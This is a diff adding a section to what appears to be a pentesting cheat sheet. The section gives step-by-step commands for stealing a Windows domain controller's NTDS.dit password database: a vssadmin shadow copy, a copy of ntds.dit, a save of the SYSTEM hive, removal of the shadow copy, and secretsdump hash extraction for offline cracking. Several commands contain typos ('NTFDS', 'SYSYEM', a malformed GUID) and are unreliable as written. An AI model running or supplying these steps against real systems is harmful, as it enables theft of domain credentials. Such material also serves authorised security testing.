@@ -110,6 +110,33 @@ diskshadow.exe
 ```
 ***
 
+#### NTDS.dit using vssadmin
+Using vssadmin we can create shadow copies of drives. Using this we can access the ntds.dit in the shadow copy volume, since it is not in use there.
+Creat a shadow copy volume:
+```
+vssadmin create shadow /for=c:
+```
+The volume should now be created and return an id and location of the copy. You could verify using:
+```
+vssadmin list shadows
+```
+Copy the ntds.dit to a writeable local location (path will probably differ):
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTFDS\ntds.dit C:\temp\ntds.dit
+```
+Save the SYSTEM key, so we can decrypt the ntds.dit file offline.
+```
+reg save HKLM\SYSYEM C:\temp\SYSTEM
+```
+Delete the shadow copy volume after you're done
+```
+vssadmin delete shadows /shadow="{2342352f-5234-252e-342345-2352342d2fd}"
+```
+We decrypt the hashes using secretsdump to crack them afterwards.
+```
+secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outfile customer_hashes.txt
+```
+
 ## Remote
 ***
 
